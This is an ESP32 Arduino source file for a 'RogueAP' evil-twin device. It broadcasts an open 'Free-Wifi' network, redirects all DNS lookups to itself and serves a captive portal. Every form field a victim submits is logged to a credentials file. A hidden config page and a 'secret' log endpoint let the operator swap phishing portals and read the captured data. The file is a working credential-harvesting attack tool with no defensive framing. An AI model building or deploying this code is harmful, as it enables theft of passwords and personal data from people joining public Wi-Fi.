/*
   RogueAP for ESP32
   version 0.1 (05/19/2018)

   - Act as fake access point
   - Respond all DNS queries with own IP
   - Provide captive portal
*/


#include <WiFiClient.h>
#include <ESP32WebServer.h>
#include <WiFi.h>
#include <DNSServer.h>
#include "FS.h"
#include <SPIFFS.h>
#include <detail/RequestHandlersImpl.h>
#include <ArduinoJson.h>
#include "default.html"

#define CONFIG_FILE "/config.json"
#define MAX_PORTALS 10

// struct for the global config
struct CONFIG {
  String activePortal = "/default.html";
  String logFileName = "/credentials.txt";
  String ssid = "Free-Wifi";
  String configDomain="wifi.obi.de";
  uint8_t numStoredPortals;
  String availablePortals[MAX_PORTALS];
} config;

// general settings - no need to change
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
JsonDocument doc;
JsonDocument json;
ESP32WebServer server(80);

/*
   SETUP
   - enable serial (for DEBUG output)
   - enable SPIFFS
   - load config from flash file system (SPIFFS)
   - enable Wifi and AP mode
   - enable DNS
   - enable webserver
*/
void setup() {
  Serial.print("setup()");
  Serial.begin(250000);

  // start flash file system and load config from JSON file
  if(!SPIFFS.begin(true)){
        Serial.println("An Error has occurred while mounting SPIFFS");
        return;
   }
  File root = SPIFFS.open("/");
 
  File f = root.openNextFile();
 
  while(f){
 
      Serial.print("FILE: ");
      Serial.println(f.name());
 
      f = root.openNextFile();
  }
  // loadConfig();

  // Enable AP mode
  WiFi.mode(WIFI_AP);
  WiFi.softAP(config.ssid.c_str());
  delay(100);   // bugfix for internal processes to finish before setting IP addr.
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  /* register callback function for webserver */
  server.on("/", servePortal);              // usual request
  server.on("/logfile.txt", serveLogFile);  // get 'secret'logfile
  server.on("/config", configPage);         // config page

  server.onNotFound(handleUnknown);

  /* start web server */
  server.begin();
  Serial.println("\n\nHTTP server started");
  
  /* write a line into the logfile to indicate the startup */
  File file = SPIFFS.open(config.logFileName, FILE_APPEND);
  if (!file) {
    Serial.println("- failed to open file for appending");
    return;
  }
  file.println("--- restart ---");

}

/*
   Main program loop
   - process DNS requests
   - process HTTP requests
*/
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}

/*
   send the 'secret' logfile
*/
void serveLogFile() {
  Serial.print("serveLogFile()");
  // verify that the request was made with the correct config url
  Serial.print("Requested FQDN: #"); Serial.print(server.hostHeader()); Serial.println("#");
  if (!server.hostHeader().equals(config.configDomain)) {
    Serial.print("does not match config FQDN! should be: #"); Serial.print(config.configDomain); Serial.println("#");
    servePortal();
    return;
  }
  // return the logfile
  serveFile(config.logFileName.c_str());
}


// serve the captive portal page
void servePortal() {
  Serial.print("servePorta()");
  // are there any arguments? in case yes, it seems like the user already clicked submit
  if (server.args() > 0) {
    // go through all arguments
    String logEntry;
    for (uint8_t i = 0; i < server.args(); i++) {
      logEntry += server.argName(i) + ": " + server.arg(i) + "   ";
    }
    logEntry += "\n";
    Serial.println(logEntry);

    // write all arguments to the logfile
    File file = SPIFFS.open(config.logFileName, FILE_APPEND);
    if (!file) {
      Serial.println("- failed to open file for appending");
      return;
    }
    file.print(logEntry);
  }
  // serve the portal page
  serveFile(config.activePortal.c_str());
}


// Trying to load scripts from SPIFFS
void handleUnknown() {
  Serial.print("handleUnkown()");
  String filename = "";
  filename += server.uri();
  Serial.print(filename);
  serveFile(filename.c_str());
} // End handleUnknown

void serveFile(const char* fileName) {
  Serial.print("serveFile()");
  File pageFile = SPIFFS.open(fileName, FILE_READ);
  if (pageFile && !pageFile.isDirectory()) {
    String contentTyp = StaticRequestHandler::getContentType(fileName);
    server.sendHeader("Cache-Control", "public, max-age=31536000");
    size_t sent = server.streamFile(pageFile, contentTyp);
    pageFile.close();
  }
  else
    servePortal();
}
/*
   Check the flash (SPIFFS) for available portals (single page HTML files)
*/
void checkAvailablePortals() {
  Serial.print("checkAvailablePortals()");
  File root = SPIFFS.open("/portals");
  if (!root) {
    Serial.println("Failed to open directory");
    return;
  }
  if (!root.isDirectory()) {
    Serial.println("Not a directory");
    return;
  }
  config.numStoredPortals = 0;
  File file = root.openNextFile();
  while (file) {
    if (!file.isDirectory()) {
      config.availablePortals[config.numStoredPortals] = file.name();
      config.numStoredPortals++;
    }
    file = root.openNextFile();
  }
}

/*
   'secret' config page
*/
void configPage() {
  Serial.print("configPage()");
  // verify that the request was made with the correct config url
  Serial.print("Requested FQDN: #"); Serial.print(server.hostHeader()); Serial.println("#");
  if (!server.hostHeader().equals(config.configDomain)) {
    Serial.print("does not match config FQDN! should be: #"); Serial.print(config.configDomain); Serial.println("#");
    servePortal();
    return;
  }

  // Check whether there are arguents or not. In case yes, store the configuration. If not, show the config page
  if (server.args() > 0) {
    // go through all arguments
    if (server.hasArg("portal")) {
      config.activePortal = server.arg("portal");
      config.activePortal.trim();
    }
    if (server.hasArg("ssid")) {
      config.ssid = server.arg("ssid");
      config.ssid.trim();
    }
    if (server.hasArg("logFile")) {
      config.logFileName = server.arg("logFile");
      config.logFileName.trim();
    }
    if (server.hasArg("configDomain")) {
      config.configDomain = server.arg("configDomain");
      config.configDomain.trim();
    }

    /* DEBUG */
    Serial.print("PORTAL: "); Serial.println(config.activePortal);
    Serial.print("SSID: "); Serial.println(config.ssid);
    Serial.print("LOG: "); Serial.println(config.logFileName);
    Serial.print("ConfigDomain: "); Serial.println(config.configDomain);

    // save config to flash
    // saveConfig();

    // send http ok message
    String html;
    html = "<html><head></head><body><h2>Config saved</h2>";
    html += config.activePortal;
    html += "<br>";
    html += config.ssid;
    html += "<br>";
    html += config.logFileName;
    html += "<br>";
    html += config.configDomain;
    html += "</body></html>";
    server.send(200, "text/html", html);
    return;

  } else {        // show config page
    // see what portals are available
    checkAvailablePortals();

    // construct config page
    String html;
    html += "<html>";
    html += "<head>";
    html += "  <title>Fake AP config page</title>";
    html += "</head>";
    html += "<body>";
    html += "  <h2>Fake AP config page</h2>";
    html += "  <div class=\"form\" action=\"/config\">";
    html += "  <form class=\"register-form\">";
    html += "    <table sytle=\"width: 100%\">";
    html += "      <tr>";
    html += "        <th>Paramater</th>";
    html += "        <th>Value</th>";
    html += "      </tr>";
    html += "      <tr>";
    html += "        <td>SSID</td>";
    html += "        <td><input type=\"ssid\" placeholder=\"SSID\" name=\"ssid\" value=\"";
    html += config.ssid;
    html += " \"/></td>";
    html += "      </tr>";
    html += "      <tr>";
    html += "        <td>LogFile</td>";
    html += "        <td><input type=\"logFile\" placeholder=\"LogFile\" name=\"logFile\" value=\"";
    html += config.logFileName;
    html += " \"/></td>";
    html += "      </tr>";
    html += "          <tr>";
    html += "          <td>Capture portal</td>";
    html += "          <td>";
    html += "            <select name=\"portal\">";
    for (uint8_t loop = 0; loop < config.numStoredPortals; loop++) {
      html += "                <option value=\"";
      html += config.availablePortals[loop];
      if (config.activePortal == config.availablePortals[loop].c_str()) {
        html += "\" selected>";
      } else {
        html += "\">";
      }
      html += config.availablePortals[loop];
      html += "</option>";
    }
    html += "            </select>";
    html += "          </td>";
    html += "        </tr>";
    html += "      <tr>";
    html += "        <td>Config domain</td>";
    html += "        <td><input type=\"configDomain\" placeholder=\"configDomain\" name=\"configDomain\" value=\"";
    html += config.configDomain;
    html += " \"/></td>";
    html += "      </tr>";
    html += "    </table>";
    html += "  <input type=\"submit\" value=\"Save\">";
    html += "  </form>";
    html += "  </div>";
    html += "</body>";
    html += "</html>";

    server.send(200, "text/html", html);
  }
}
